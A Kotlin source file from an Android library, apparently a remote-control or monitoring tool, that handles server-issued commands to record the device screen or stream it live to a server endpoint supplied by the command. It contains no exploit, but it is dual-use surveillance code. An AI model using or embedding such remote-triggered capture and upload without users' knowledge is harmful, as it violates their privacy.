package com.hawkshaw.library.features.screen

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.util.Log
import androidx.annotation.RequiresApi
import com.hawkshaw.library.App
import com.hawkshaw.library.datalayer.models.Command
import com.hawkshaw.library.features.screen.ScreenRecordingService.Companion.ACTION_START_RECORDING
import com.hawkshaw.library.features.screen.ScreenRecordingService.Companion.ACTION_STOP_RECORDING
import com.hawkshaw.library.features.screen.ScreenRecordingService.Companion.EXTRA_DURATION
import com.hawkshaw.library.features.screen.ScreenRecordingService.Companion.EXTRA_QUALITY
import com.hawkshaw.library.features.screen.ScreenRecordingService.Companion.EXTRA_RECORDING_ID
import com.hawkshaw.library.features.screen.ScreenRecordingService.Companion.EXTRA_RESOLUTION
import com.hawkshaw.library.features.screen.ScreenRecordingService.Companion.EXTRA_RESULT_CODE
import com.hawkshaw.library.features.screen.ScreenRecordingService.Companion.EXTRA_RESULT_DATA
import com.hawkshaw.library.features.screen.ScreenProjectionService.Companion.ACTION_START_PROJECTION
import com.hawkshaw.library.features.screen.ScreenProjectionService.Companion.ACTION_STOP_PROJECTION
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

/**
 * Handler for screen recording and projection commands
 */
object ScreenCommandHandler {
    
    private const val TAG = "ScreenCommandHandler"
    private const val SCREEN_CAPTURE_REQUEST_CODE = 1000
    
    private var pendingRecordingCommand: Command? = null
    private var pendingProjectionCommand: Command? = null
    
    /**
     * Handle screen recording command
     */
    fun handleRecordScreenCommand(command: Command) {
        Log.d(TAG, "[DEBUG] handleRecordScreenCommand called")
        
        // For now, we'll use the text field to determine the action
        // until proper request classes are added to Command.kt
        when (command.type) {
            Command.CommandType.RecordScreen -> {
                when (command.text?.lowercase()) {
                    "start" -> {
                        // Default quality to medium if not specified
                        val quality = command.title?.lowercase() ?: "medium"
                        // Default duration to 60 seconds if not specified
                        val duration = command.timestamp?.toInt() ?: 60
                        startScreenRecording(command, quality, duration, null)
                    }
                    "stop" -> {
                        stopScreenRecording()
                    }
                    else -> {
                        Log.e(TAG, "[ERROR] Unknown RecordScreen action: ${command.text}")
                    }
                }
            }
            else -> {
                Log.w(TAG, "[WARNING] Unknown screen recording command type: ${command.type}")
            }
        }
    }
    
    /**
     * Handle screen projection command
     */
    @RequiresApi(Build.VERSION_CODES.O)
    fun handleScreenProjectionCommand(command: Command) {
        Log.d(TAG, "[DEBUG] handleScreenProjectionCommand called")
        
        when (command.type) {
            Command.CommandType.StartScreenProjection -> {
                // Use command properties directly since the request class is missing
                val sessionId = command.text ?: "default_session_${System.currentTimeMillis()}"
                val quality = command.title?.lowercase() ?: "medium"
                val frameRate = command.timestamp?.toInt() ?: 15
                val resolution = command.authData?.get("resolution") ?: "1920x1080"
                val serverEndpoint = command.authData?.get("server_endpoint")
                
                if (serverEndpoint != null) {
                    startScreenProjection(
                        command = command,
                        sessionId = sessionId,
                        projectionType = "view_only",
                        quality = quality,
                        frameRate = frameRate,
                        resolution = resolution,
                        serverEndpoint = serverEndpoint
                    )
                } else {
                    Log.e(TAG, "[ERROR] Missing server endpoint for screen projection")
                }
            }
            Command.CommandType.StopScreenProjection -> {
                // Use command text as session ID or stop all if not specified
                val sessionId = command.text
                stopScreenProjection(sessionId)
            }
            else -> {
                Log.w(TAG, "[WARNING] Unknown screen projection command type: ${command.type}")
            }
        }
    }
    
    private fun startScreenRecording(command: Command, quality: String, duration: Int, resolution: String?) {
        Log.d(TAG, "[DEBUG] startScreenRecording called with quality: $quality, duration: $duration")
        
        try {
            pendingRecordingCommand = command
            
            val context = App.getContext()
            val mediaProjectionManager = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            val captureIntent = mediaProjectionManager.createScreenCaptureIntent()
            
            // Start screen capture permission activity
            val intent = Intent(context, ScreenCapturePermissionActivity::class.java).apply {
                putExtra("capture_intent", captureIntent)
                putExtra("request_type", "recording")
                putExtra(EXTRA_QUALITY, quality)
                putExtra(EXTRA_DURATION, duration)
                putExtra(EXTRA_RESOLUTION, resolution)
                putExtra(EXTRA_RECORDING_ID, generateRecordingId())
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            
            context.startActivity(intent)
            
        } catch (e: Exception) {
            Log.e(TAG, "[ERROR] Failed to start screen recording", e)
        }
    }
    
    private fun stopScreenRecording() {
        Log.d(TAG, "[DEBUG] stopScreenRecording called")
        
        try {
            val context = App.getContext()
            val intent = Intent(context, ScreenRecordingService::class.java).apply {
                action = ACTION_STOP_RECORDING
            }
            context.startService(intent)
            
        } catch (e: Exception) {
            Log.e(TAG, "[ERROR] Failed to stop screen recording", e)
        }
    }
    
    private fun startScreenProjection(
        command: Command,
        sessionId: String,
        projectionType: String,
        quality: String,
        frameRate: Int,
        resolution: String?,
        serverEndpoint: String
    ) {
        Log.d(TAG, "[DEBUG] startScreenProjection called with sessionId: $sessionId")
        
        try {
            pendingProjectionCommand = command
            
            val context = App.getContext()
            val mediaProjectionManager = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            val captureIntent = mediaProjectionManager.createScreenCaptureIntent()
            
            // Start screen capture permission activity
            val intent = Intent(context, ScreenCapturePermissionActivity::class.java).apply {
                putExtra("capture_intent", captureIntent)
                putExtra("request_type", "projection")
                putExtra(ScreenProjectionService.EXTRA_SESSION_ID, sessionId)
                putExtra(ScreenProjectionService.EXTRA_QUALITY, quality)
                putExtra(ScreenProjectionService.EXTRA_FRAME_RATE, frameRate)
                putExtra(ScreenProjectionService.EXTRA_RESOLUTION, resolution)
                putExtra(ScreenProjectionService.EXTRA_SERVER_ENDPOINT, serverEndpoint)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            
            context.startActivity(intent)
            
        } catch (e: Exception) {
            Log.e(TAG, "[ERROR] Failed to start screen projection", e)
        }
    }
    
    private fun stopScreenProjection(sessionId: String?) {
        Log.d(TAG, "[DEBUG] stopScreenProjection called for sessionId: $sessionId")
        
        try {
            val context = App.getContext()
            val intent = Intent(context, ScreenProjectionService::class.java).apply {
                action = ACTION_STOP_PROJECTION
            }
            context.startService(intent)
            
        } catch (e: Exception) {
            Log.e(TAG, "[ERROR] Failed to stop screen projection", e)
        }
    }
    
    /**
     * Handle screen capture permission result
     */
    fun handleScreenCaptureResult(requestCode: Int, resultCode: Int, data: Intent?, requestType: String, extras: Intent) {
        Log.d(TAG, "[DEBUG] handleScreenCaptureResult called with requestCode: $requestCode, resultCode: $resultCode, requestType: $requestType")
        
        if (requestCode == SCREEN_CAPTURE_REQUEST_CODE && resultCode == Activity.RESULT_OK && data != null) {
            when (requestType) {
                "recording" -> {
                    val command = pendingRecordingCommand
                    if (command != null) {
                        val context = App.getContext()
                        val intent = Intent(context, ScreenRecordingService::class.java).apply {
                            action = ACTION_START_RECORDING
                            putExtra(EXTRA_RESULT_CODE, resultCode)
                            putExtra(EXTRA_RESULT_DATA, data)
                            // Use command properties directly
                            putExtra(EXTRA_QUALITY, command.title?.lowercase() ?: "medium")
                            putExtra(EXTRA_DURATION, command.timestamp?.toInt() ?: 60)
                            putExtra(EXTRA_RESOLUTION, command.authData?.get("resolution"))
                            putExtra(EXTRA_RECORDING_ID, extras.getStringExtra(EXTRA_RECORDING_ID))
                        }
                        context.startService(intent)
                    } else {
                        Log.e(TAG, "[ERROR] No pending recording command found")
                    }
                }
                "projection" -> {
                    val command = pendingProjectionCommand
                    if (command != null) {
                        val context = App.getContext()
                        val intent = Intent(context, ScreenProjectionService::class.java).apply {
                            action = ACTION_START_PROJECTION
                            putExtra(ScreenProjectionService.EXTRA_RESULT_CODE, resultCode)
                            putExtra(ScreenProjectionService.EXTRA_RESULT_DATA, data)
                            // Use command properties directly
                            putExtra(ScreenProjectionService.EXTRA_SESSION_ID, command.text ?: "default_session_${System.currentTimeMillis()}")
                            putExtra(ScreenProjectionService.EXTRA_QUALITY, command.title?.lowercase() ?: "medium")
                            putExtra(ScreenProjectionService.EXTRA_FRAME_RATE, command.timestamp?.toInt() ?: 15)
                            putExtra(ScreenProjectionService.EXTRA_RESOLUTION, command.authData?.get("resolution") ?: "1920x1080")
                            putExtra(ScreenProjectionService.EXTRA_SERVER_ENDPOINT, command.authData?.get("server_endpoint") ?: "")
                        }
                        context.startService(intent)
                    } else {
                        Log.e(TAG, "[ERROR] No pending projection command found")
                    }
                }
                else -> {
                    Log.w(TAG, "[WARNING] Unknown request type: $requestType")
                }
            }
        } else {
            Log.w(TAG, "[WARNING] Screen capture permission denied or failed")
        }
    }
    
    private fun generateRecordingId(): String {
        return "screen_${System.currentTimeMillis()}_${(1000..9999).random()}"
    }
}
